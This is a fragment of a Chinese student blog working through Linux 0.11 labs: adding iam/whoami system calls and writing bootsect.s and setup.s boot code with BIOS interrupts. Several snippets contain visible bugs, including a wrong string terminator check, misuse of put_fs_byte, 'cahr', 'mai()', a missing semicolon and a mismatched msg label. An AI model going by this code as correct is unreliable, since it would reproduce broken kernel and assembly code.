inline unsigned char get_fs_byte(const char * addr) { unsigned register char _v; __asm__ (\u0026#34;movb %%fs:%1,%0\u0026#34;:\u0026#34;=r\u0026#34; (_v):\u0026#34;m\u0026#34; (*addr)); return _v; } extern inline void put_fs_byte(char val,char *addr) { __asm__ (\u0026#34;movb %0,%%fs:%1\u0026#34;::\u0026#34;r\u0026#34; (val),\u0026#34;m\u0026#34; (*addr)); }   即put_fs_byte和其配套，可将内核态数据写入用户态。\n我们是否可以获得一个规律put_fs_xxx() and put_fs_xxx()是用来连接内核态和用户态的呢？\n那我们开始写sys_iam 和 sys_whoami函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include \u0026lt;string.h\u0026gt;#include \u0026lt;errno.h\u0026gt;#include \u0026lt;asm/segment.h\u0026gt; #define maxsize 24 char msg[maxsize]; int msglen; int sys_iam(const char* name){ int len=0; while(get_fs_byte(\u0026amp;name[len])!=\u0026#39;0\u0026#39;) len++; if(len\u0026gt;23) return -EINVAL; int i=0; for(;i\u0026lt;len;++i) msg[i] = get_fs_byte(\u0026amp;name[i]); msg[i] = \u0026#39;\\0\u0026#39;; msglen = len; return msglen; } int sys_whoami(char *name, unsigned size){ if(size \u0026lt; msglen) return -EINVAL; int i=0; for(;i\u0026lt;msglen;++i) name[i] = put_fs_byte(msg[i]); return msglen; }   当我们who.c完成后要在makefile里面增加对who.o的依赖\n如下图：\n然后在添加对who.c and who.o 的依赖的产生条件,如下图：\n完成上述步骤后，执行下面指令\n1  make all   进行整体编译\n然后我们运行 Linux0.11，我们还需要在这里面添加iam和whoami两个系统调用号的宏定义。\n1 2  cd /usr/include/ vi unistd.h   然后加上系统调用号\n然后\n1 2 3  cd /usr/root/ vi iam.c vi whoami.c   进行我们用户程序iam.c代码的编写（将传入字符串写入内核空间）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  #define __LIBRARY__ // #include \u0026lt;unistd.h\u0026gt;\t// 要想调用系统调用需要这些两个#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; _syscall1(int,iam,const cahr*,name);//iam()系统调用的用户接口  int main(int argc, char **argv){ int i; if(argc!=2){ printf(\u0026#34;Usage: %s \u0026lt;message\u0026gt;\\n\u0026#34;,argv[0],argv[1]); return 0; } i = iam(argv[1]); //这句系统调用就将我们传入的name写入了内核空间  if(i != strlen(argv[1])){ printf(\u0026#34;set message error\\n\u0026#34;); return 0 } return 0; }   在进行whoami.c的编写\n1 2 3 4 5 6 7 8 9 10 11 12  #define __LIBRARY__ #include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt; _syscall2(int,whoami,char *,name, unsigned int,size); int mai(){ char message[24]; whoami(message,24); printf(\u0026#34;%s\\n\u0026#34;,message); return 0; }   我们采用如下命令编译iam.c和whoami.c两个文件\n1 2  gcc -o iam iam.c gcc -o whoami whoami.c   只要没有其他语句出现那么就算程序写对了\n然后我们运行代码得到如下结果\n至此我们的任务完成！！！\n我们总结一下，\n系统调用的步骤-\u0026gt;明白系统调用需要添加哪些信息代码-\u0026gt;编写系统调用的响应函数（就是系统调用iam()后他会执行的功能的函数）-\u0026gt;用户程序调用执行。\n了解系统调用过程要明白0x80号中断是如何陷入内核态的\n这里我们__NR_xxxx是系统调用号，一个宏定义。在响应函数表里添加响应函数sys_xxx。编写响应函数（也称内核函数）。\n用户程序需要#define __ LIBRARY __ ; #include \u0026lt;unistd.h\u0026gt; ; _ syscall1(type,name,type,parameter….)。分别是 使能 _syscallx函数，引入系统调用号的宏，创建系统调用的用户程序接口（系统调用的API）。\n我们这里是直接调用系统调用，所以直接使用_syscallx，平时例如我们使用的printf作为系统调用的API\n附：\nerrno是传统的错误代码返回机制。通常我们会返回0或1代表正确或错误，但不能说明哪错了，错了什么。所以全局变量errno就能保存错误值，调用者可以通过判断errno来决定如何应对错误。错误值的含义都有标准定义。\n","permalink":"http://int80.top/oslab2/","tags":["操作系统"],"title":"操作系统的系统调用"},{"categories":["操作系统"],"contents":"lab 1 环境：通过bochs虚拟机运行的linux0.11\n0x7C00是BIOS将主引导扇区（第一个扇区）内容载入进内存的一个地址。操作系统或者引导程序必须假设他们的汇编代码从内存的0x7C00地址开始\ntask 1 更改系统启动的提示文字。\n文件在boot/bootsect.s中。\n直接用源码的这个文件在里面改也是可以的，也可以自己写一个如下内容的bootsect.s来进行实验，也是能正常运行。（记得备份）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  entry _start _start: ！获得光标位置 mov ah,#0x03 xor bh,bh int 0x10 ！0x10中断的0x03功能是读取光标位置（百度该中断的功能） ！对输出信息的操作 mov cx,#33 !要显示字符串的长度 mov bx,#0x000c !显示字符串的颜色（这为红色 mov bp,#msg1\t!向该寄存器读入msg1，向屏幕写入该字符串 ！这里需要额外处理es寄存器，源码在这段代码前就处理过了，所以源码看不到这段。 mov ax,#0x07c0 mov es,ax ！es:bp是显示字符串的地址 mov ax,#0x1301 !向屏幕写字符串并移动光标到末尾。如果写0x1300，你会发现光标返回到了起始位置 int 0x10 ！和上一条指令相关，!0x1301是调用0x10中断的13号功能中的1号子功能 inf_loop: jmp inf_loop ！死循环让界面保持 msg1: .byte 13,10 ！回车换行 .ascii \u0026#34;Hey Doors system loading...\u0026#34; .byte 13,10,13,10 ！回车换行回车换行 .org 510 ！之后的语句从510地址开始 boot_flag: .word 0xAA55 ！磁盘引导标志0xAA55。引导扇区的最后两个字节，用来识别引导扇区   1 2 3 4 5 6  编译bootsect.s 1. cd 进入 bootsect.s文件所在文件夹 2. 通过如下命令分别编译和链接bootsect.s $ as86 -0 -a -o bootsect.o bootsect.s $ ld86 -0 -s -o bootsect bootsect.o 3. 通过 ls -s 命令查看 文件信息，会发现bootsect 为544字节，但一个扇区的大小为512字节   因为ld86产生的是Minix可执行文件，该类型额外包括MInix可执行文件头部，结构如下\n1 2 3 4 5 6 7 8 9 10 11 12  struct exec { unsigned char a_magic[2]; //执行文件魔数  unsigned char a_flags; unsigned char a_cpu; //CPU标识号  unsigned char a_hdrlen; //头部长度，32字节或48字节  unsigned char a_unused; unsigned short a_version; long a_text; long a_data; long a_bss; //代码段长度、数据段长度、堆长度  long a_entry; //执行入口地址  long a_total; //分配的内存总量  long a_syms; //符号表大小 };   通过计算 char6(6 byte)+short1(2 byte)+long*6(24 byte)=32 byte，512+32=544.所以我们应该跳过bootsect的前32字节，再把他放入引导扇区中。\n根据如下命令\n1  $ dd bs=1 if=bootsect of=Image skip=32   将编译产生的Image文件复制到Linux-0.11目录下\n1 2 3 4 5  当前工作路径仍然为Linux-0.11/boot/ $ cp ./Image ../Image # 执行 oslab 目录中的 run 脚本（bochs的运行脚本） $ ../../run   综上，得到如下界面\nbootsect.s是操作系统最开始的部分，共512个字节，再0磁道0扇区位置，读入内存0x7c00。\n现在系统还在实模式下运行，物理地址=代码段cs*16+偏移，所以代码里写BOOTSEG=0x07c0才能得到0x7c00（这里的代码没用到）\nbootsect.s和setup.s是为了完成将内核加载到内存，并跳转到内核执行而写的。bootsect.s是由BIOS加载到内存中，无法完成跳转到内核执行的任务。而setup.s就能完成进入32位模式并跳转到内核执行的任务，还可通过BIOS中断获取硬件信息的任务。\n所以接着我们应该编写setup.s文件，让其输出提示该文件开始运行的字符串，再让其输出光标位置，内存大小和磁参数等硬件信息\ntask 2 首先输出字符串\n我们直接将bootsect.s的代码复制过来，因为现在两者功能都是输出字符串。\n但我们需要进行一些更改\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  entry _start _start: ！获得光标位置 mov ah,#0x03 xor bh,bh int 0x10 ！0x10中断的0x03功能是读取光标位置（百度该中断的功能） ！对输出信息的操作 mov cx,#28 #要显示字符串的长度 mov bx,#0x000c #显示字符串的颜色（这为红色 mov bp,#msg2 !(更改为msg2)\t#向该寄存器读入msg2，向屏幕写入该字符串 ！这个时候要修改es的值，用了cs的值。 mov ax,cs mov es,ax ！es：bp是显示字符串的地址 mov ax,#0x1301 ！向屏幕写字符串并移动光标到末尾。如果写0x1300，你会发现光标返回到了起始位置 int 0x10 ！和上一条指令相关，#0x1301是调用0x10中断的13号功能中的1号子功能 inf_loop: jmp inf_loop ！死循环让界面保持 msg1: .byte 13,10 ！回车换行 .ascii \u0026#34;OK we are in SETUP now\u0026#34; .byte 13,10,13,10 ！回车换行回车换行 .org 510 ！之后的语句从510地址开始 boot_flag: .word 0xAA55 ！磁盘引导标志0xAA55。引导扇区的最后两个字节，用来识别引导扇区   上面是setup.s文件的内容，\n此时我们还需要更改bootsect.s的内容让其能载入setup.s文件\n我们需要确定setup所占用的扇区，bootsect.s只占用一个扇区，setup.s从下一个扇区开始，我们定义其占用两个（Linux0.11占用4个）。源码会将bootsect移动到0x9000处，此处我们不移动，所以bootsect.s在内存的0x7c00的位置，占512个字节，那么setup就载入0x7e00处，因为是实模式，所以逻辑地址应该为0x07e0.\nbootsect.s代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  SETUPLEN=2 SETUPSEG=0x07e0 ！setup载入地址 entry _start _start: mov ah,#0x03 xor bh,bh int 0x10 mov cx,#33 mov bx,#0x0007 mov bp,#msg1 mov ax,#0x07c0 mov es,ax ！把es指向0x07c0有什么用？ mov ax,#0x1301 int 0x10 ！以上和之前的bootsect一样 load_setup: mov dx,#0x0000 ！设置驱动器和磁头：软盘0，磁头0，是因为调用了13号中断才能控制磁盘，不是0x0000地址的意思 mov cx,#0x0002\t！设置扇区号和磁道：磁头0 磁道0 扇区2 mov bx,#0x0200\t！设置读入的内存地址：es:bx bx是偏移地址，BOOTSEG=0X0000+adress=512=0x0200，偏移512字节 mov ax,#0x0200+SETUPLEN ！设置读入的扇区数 int 0x13 ！调用0x13中断，功能是读入2个setup.s扇区 jnc ok_load_setup ！读入成功就跳转到该函数 mov dx,#0x0000 ！否则进入下段 mov ax,#0x0000 ！复位软盘 int 0x13 jmp load_setup！重新循环再次尝试读取 ok_load_setup: jmpi 0,SETUPSEG ！跳到setup载入的地址执行该文件 msg1: .byte 13,10 .ascii \u0026#34;Hey Doors System loading...\u0026#34; .byte 13,10,13,10 .org 510 boot_flag: .word 0xAA55   以上 bootsect.s和setup.s就完成，接着是通过makefile共同编译\n指令如下\n1  $ make BootImage   然后会得到报错\n1 2  Unable to open \u0026#39;system\u0026#39; make: *** [BootImage] Error 1   因为makefile会执行build.c，他要求命令行参数得到bootsect、setup和system内核的文件名。但我们只做了前两者，所以会报错，那我们直接将build.c第三个参数的部分代码注释掉即可。\n如图所示。\n接着再使用如下指令\n1 2 3  $ cd ~/oslab/linux-0.11 $ make BootImage $ ../run   将得到如下结果\ntask 3 接着在完善setup.s文件让其还能再输出光标位置，内存大小和磁盘参数的信息\n我们将这些信息载入内存0x9000的位置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172  INITSEG = 0x9000 entry _start _start: ! print string mov ah,#0x03 ! cursor pos get xor bh,bh int 0x10 mov cx,#28 mov bx,#0x000c ！字符颜色 mov bp,#msg2\tmov ax,cs mov es,ax ！修改es的值为cs mov ax,#0x1301 int 0x10 mov ax,cs mov es,ax !init ss:sp 初始化栈 mov ax,#INITSEG mov ss,ax ！栈指向0x9000 mov sp,#0xFF00 ！设置512B偏移地址，arbitrary value\u0026gt;\u0026gt;512，因为刚开始后面的内存空间都没被使用（这啥解释嘛） !cursor info mov ax,#INITSEG mov ds,ax ！ds寄存器指向0x9000，下面开始让各数据载入0x9000位置 mov ah,#0x03 xor bh,bh int 0x10 ！获取光标位置信息 mov [0],dx ！[0]从0x9000开始，将获取的数据放入这个内存地址 !memory info mov ah,#0x88 int 0x15 ！通过0x15中断得到memory大小信息 mov [2],ax ！存入0x9002位置 ! disk parameter 磁盘参数表 mov ax,#0x0000 mov ds,ax ！将数据段移动到0x0000，也是ram开始的位置，这个地方（0-1024）的位置存放中断向量表。在41号中断处读取第一个磁盘的参数。（不懂，不知道对不对。0x0000之前不是磁盘的地址吗）！！该问题已解决，在后面会独立说明。 ！乘4是因为中断向量表每个表项占4B，那么41号中断的入口地址自然为4*0x41 ！乘4就是将0x41左移两位，lds有两步操作：si\u0026lt;-4*0x41,ds\u0026lt;-[4*0x41+2]，中断向量表存储的只是相应中断号中断服务程序的入口地址。 ！其构造是4个字节单元，第2字节位偏移量ip，高两字节为服务程序段地址，所以ds是中断服务程序段地址，si为中断服务程序偏移。因此可以执行0x41中断的服务程序，把第一个磁盘的参数表取出来。 ！相当于运行 mov si,[4*0x41] mov ds,[4*0x41+2] lds si,[4*0x41] mov ax,#INITSEG mov es,ax mov di,#0x0004 mov cx,#0x10 #拷贝16字节的数据。一个磁盘参数表大小为16字节，第一个磁盘的参数表地址为0x9080，第二个为0x9090 rep movsb !ready to print mov ax,cs mov es,ax ！es:bp是输出字符串存放的地址 mov ax,#INITSEG\t！让ds寄存器指向0x9000 mov ds,ax !cursor position mov ah,#0x03 xor bh,bh int 0x10 mov cx,#11 mov bx,#0x0007 mov bp,#msg_cursor mov ax,#0x1301 int 0x10 mov ax,[0] ！将0x9000地址内容放入ax寄存器，print_hex函数用 call print_hex ！输出msg_cursor内容 call print_nl ！输出个回车 ！下面的都是相同的，不再注释 !memory size mov ah,#0x03 xor bh,bh int 0x10 mov cx,#12 mov bx,#0x0007 mov bp,#msg_memory mov ax,#0x1301 int 0x10 mov ax,[2] call print_hex call print_nl !cyles mov ah,#0x03 xor bh,bh int 0x10 mov cx,#25 mov bx,#0x0007 mov bp,#msg_cyles mov ax,#0x1301 int 0x10 mov ax,[4] call print_hex !heads mov ah,#0x03 xor bh,bh int 0x10 mov cx,#8 mov bx,#0x0007 mov bp,#msg_heads mov ax,#0x1301 int 0x10 mov ax,[6] call print_hex call print_nl !sectors mov ah,#0x03 xor bh,bh int 0x10 mov cx,#8 mov bx,#0x0007 mov bp,#msg_sectors mov ax,#0x1301 int 0x10 mov ax,[12] ！18？不太明白这个怎么每个数据长度怎么算的，可能固定有直接百度就可以？这个应该没必要深究 call print_hex call print_nl inf_loop: jmp inf_loop print_hex: mov cx,#4 ！16位二进制数以4位16进制表示，因为十六进制和ASCII有很好的对应 mov dx,ax ！将0x900x位置的数放入数据寄存器 print_digit: rol dx,#4 ！从高位到低位显示4位16进制数 mov ax,#0xe0f ！ah = 请求的功能值，al = 半字节(4 bit)掩码 and al,dl ！取dl的低4 bit add al,#0x30 cmp al,#0x3a ！数字的十六进制范围为0x30~0x39，小于0x3a jl outp ！al小于0x3a（为数字）跳转， add al,#0x07 ！否则就是字母，根据十六进制转ascii码的字母，字母要加上0x07，a~f的范围为0x41~0x46 outp: int 0x10 loop print_digit ！每次loop，cx-1，判断cx是否等于0，不为0就继续循环，为0就顺序执行，共循环4次 ret print_nl: mov ax,#0xe0d int 0x10 mov al,#0xa int 0x10 ret msg2: .byte 13,10 .ascii \u0026#34;OK we are in SETUP now\u0026#34; .byte 13,10,13,10 msg_cursor: .ascii \u0026#34;Cursor Pos:\u0026#34; msg_memory: .ascii \u0026#34;Memory Size:\u0026#34; msg_cyles: .ascii \u0026#34;KB\u0026#34; .byte 13,10,13,10 .ascii \u0026#34;HD Info\u0026#34; .byte 13,10 .ascii \u0026#34;Cylinders:\u0026#34; msg_heads: .ascii \u0026#34;Headers:\u0026#34; msg_sectors: .ascii \u0026#34;Sectors:\u0026#34; .org 510 boot_flag: .word 0xAA55   我们可以得到结果（我第一次试的时候不会弹两个窗口，但是第一次运行得到的数据出错）\n第一次运行：\n第二次运行\n对第二次分析\nmemory size = 3c00KB+1MB=16MB\ncylinders=00cc（H）=204（D）\n一些问题：\n首要问题 还是对汇编各种寄存器操作比较陌生，但还好慢慢啃，也能明白10%，知道基本的用法，需要抽时间好好学汇编。目前问题就是为什么有些寄存器能直接获得某些值，而不用赋值。不明白各种寄存器的用法和它本身会自己进行的操作有哪些。（提的问题也比较模糊，因为确实对汇编了解过少）例如为什么要把cs的值赋给es？之前也没有处理cs，他是代码寄存器，会默认存储代码段的地址吗？大概就是这类的问题。\n之前提到一个问题就是 为什么在bootsect.s中 mov ds，0x0000 是控制磁盘，而在setup.s中mov ax，0x0000却是中断向量表的位置。 答案：前者的是在int 0x13 即BIOS中断上操作的0x0000是对某个寄存器设置相应的值来获得某种功能进而控制磁盘，不是内存地址的0x0000。而setup.s的0x0000是内存的地址。\n","permalink":"http://int80.top/oslab1/","tags":["操作系统"],"title":"操作系统的引导"},{"categories":null,"contents":"INT80, 电子科技大学信通学院本科生\n​\t正努力自学成为一位白帽子\n","permalink":"http://int80.top/aboutme/","tags":null,"title":"About Me"},{"categories":null,"contents":"","permalink":"http://int80.top/search/","tags":null,"title":"Search"}]